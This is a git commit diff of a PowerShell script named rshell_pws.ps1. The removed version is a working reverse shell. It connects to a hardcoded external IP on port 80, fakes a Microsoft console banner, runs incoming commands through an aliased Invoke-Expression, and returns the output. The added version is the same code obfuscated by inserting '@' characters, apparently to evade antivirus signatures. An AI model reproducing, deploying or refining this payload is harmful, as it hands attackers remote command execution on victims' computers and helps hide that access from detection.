f999f9685aa05843f6a1de24180616569c25b8ef
Yorkvik <31284407+yorkvik@users.noreply.github.com>
2023-06-13 14:41:00 +0200

    Update rshell_pws.ps1

--- rshell_pws.ps1
+++ rshell_pws.ps1
@@ -1,18 +1,18 @@
-Set-Alias -Name K -Value Out-String
-Set-Alias -Name nothingHere -Value iex
-$BT = New-Object "S`y`stem.Net.Sockets.T`CPCl`ient"('88.99.28.233', 80);
-$replace = $BT.GetStream();
-[byte[]]$B = 0..(32768*2-1)|%{0};
-$B = ([text.encoding]::UTF8).GetBytes("(c) Microsoft Corporation. All rights reserved.`n`n")
-$replace.Write($B,0,$B.Length)
-$B = ([text.encoding]::ASCII).GetBytes((Get-Location).Path + '>')
-$replace.Write($B,0,$B.Length)
-[byte[]]$int = 0..(10000+55535)|%{0};
-while(($i = $replace.Read($int, 0, $int.Length)) -ne 0){;
-$ROM = [text.encoding]::ASCII.GetString($int,0, $i);
-$I = (nothingHere $ROM 2>&1 | K );
-$I2  = $I + (pwd).Path + '> ';
-$U = [text.encoding]::ASCII.GetBytes($I2);
-$replace.Write($U,0,$U.Length);
-$replace.Flush()};
-$BT.Close()
+S@t-Alia@s@ -Na@m@ K -Va@lu@ Out-String
+S@t-Alia@s@ -Na@m@ nothingH@r@ -Va@lu@ i@x
+$BT = N@w-Obj@ct "S`y`s@t@m.N@t.Sock@ts@.T`CPCl`i@nt"('88.99.28.233', 80);
+$r@pla@c@ = $BT.G@tStr@a@m();
+[byt@[]]$B = 0..(32768*2-1)|%{0};
+$B = ([t@xt.@ncoding]::UTF8).G@tByt@s@("(c) Micros@oft Corpora@tion. All rights@ r@s@@rv@d.`n`n")
+$r@pla@c@.Writ@($B,0,$B.L@ngth)
+$B = ([t@xt.@ncoding]::ASCII).G@tByt@s@((G@t-Loca@tion).Pa@th + '>')
+$r@pla@c@.Writ@($B,0,$B.L@ngth)
+[byt@[]]$int = 0..(10000+55535)|%{0};
+whil@(($i = $r@pla@c@.R@a@d($int, 0, $int.L@ngth)) -n@ 0){;
+$ROM = [t@xt.@ncoding]::ASCII.G@tString($int,0, $i);
+$I = (nothingH@r@ $ROM 2>&1 | K );
+$I2  = $I + (pwd).Pa@th + '> ';
+$U = [t@xt.@ncoding]::ASCII.G@tByt@s@($I2);
+$r@pla@c@.Writ@($U,0,$U.L@ngth);
+$r@pla@c@.Flus@h()};
+$BT.Clos@@()
